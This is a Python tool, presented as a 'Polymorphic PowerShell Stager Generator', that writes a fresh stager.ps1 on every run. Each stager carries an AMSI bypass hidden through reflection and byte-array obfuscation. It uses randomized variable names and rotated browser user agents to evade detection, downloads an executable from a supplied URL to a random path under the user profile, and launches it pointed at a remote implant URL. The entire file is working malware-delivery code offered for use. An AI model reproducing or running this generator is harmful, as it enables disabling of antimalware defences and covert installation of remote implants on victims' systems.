#!/usr/bin/env python3
"""
Polymorphic PowerShell Stager Generator
Generates a unique stager.ps1 on each invocation with:
- AMSI bypass via reflection (randomized each time)
- Randomized variable names
- String obfuscation via char code arrays
- Random user agents
- Unique temp file names
"""

import random
import string
import argparse


def rand_var():
    """Random PowerShell variable name."""
    return '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))


def to_char_codes(s):
    """Convert string to PowerShell char code construction."""
    codes = ','.join(str(ord(c)) for c in s)
    return f"$([Text.Encoding]::UTF8.GetString([byte[]]({codes})))"


def to_byte_array(s):
    """Convert string to [byte[]] construction."""
    codes = ','.join(str(ord(c)) for c in s)
    return f"[byte[]]({codes})"


def gen_amsi_bypass():
    """Generate a randomized AMSI bypass."""
    # Variable names
    v_type = rand_var()
    v_field = rand_var()
    v_cn = rand_var()
    v_fn = rand_var()

    # Build "System.Management.Automation.AmsiUtils" from byte arrays
    part1_bytes = to_byte_array("System.Management.Automation.")
    part2_bytes = to_byte_array("AmsiUtils")
    field_bytes = to_byte_array("amsiInitFailed")

    bypass = f"""{v_cn}=[Text.Encoding]::UTF8.GetString({part1_bytes})+[Text.Encoding]::UTF8.GetString({part2_bytes})
{v_fn}=[Text.Encoding]::UTF8.GetString({field_bytes})
{v_type}=[Ref].Assembly.GetType({v_cn})
{v_field}={v_type}.GetField({v_fn},[Reflection.BindingFlags]'NonPublic,Static')
{v_field}.SetValue($null,$true)"""

    return bypass


def generate(runner_url, implant_url, output_path="stager.ps1"):
    v_base = rand_var()
    v_runner_url = rand_var()
    v_implant_url = rand_var()
    v_temp = rand_var()
    v_suffix = rand_var()
    v_dest = rand_var()
    v_wc = rand_var()
    v_ua = rand_var()
    v_agents = rand_var()
    v_proc = rand_var()

    amsi = gen_amsi_bypass()

    # Random user agents
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    ]
    random.shuffle(agents)

    # Random suffix length
    suffix_len = random.randint(8, 14)

    stager = f"""# Generated stager - {random.randint(10000,99999)}
{amsi}

{v_runner_url}='{runner_url}'
{v_implant_url}='{implant_url}'

{v_temp}=$env:USERPROFILE
if(-not {v_temp}){{{v_temp}=$pwd.Path}}
{v_suffix}=-join(1..{suffix_len}|%{{[char](Get-Random -Min 97 -Max 123)}})
{v_dest}=Join-Path {v_temp} "{v_suffix}.exe"

{v_wc}=New-Object Net.WebClient
{v_agents}=@('{agents[0]}','{agents[1]}')
{v_wc}.Headers.Add('User-Agent',{v_agents}[(Get-Random -Max {v_agents}.Count)])
{v_wc}.DownloadFile({v_runner_url},{v_dest})

Start-Sleep -Milliseconds (Get-Random -Min 50 -Max 500)
{v_proc}=Start-Process -FilePath {v_dest} -ArgumentList '-remote',{v_implant_url} -PassThru -NoNewWindow
"""

    with open(output_path, 'w') as f:
        f.write(stager)

    print(f"[+] Generated polymorphic stager: {output_path}")
    return output_path


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Polymorphic Stager Generator')
    parser.add_argument('--runner-url', required=True, help='URL to runner.exe')
    parser.add_argument('--implant-url', required=True, help='URL to implant.enc')
    parser.add_argument('-o', '--output', default='stager.ps1', help='Output file path')
    args = parser.parse_args()

    generate(args.runner_url, args.implant_url, args.output)
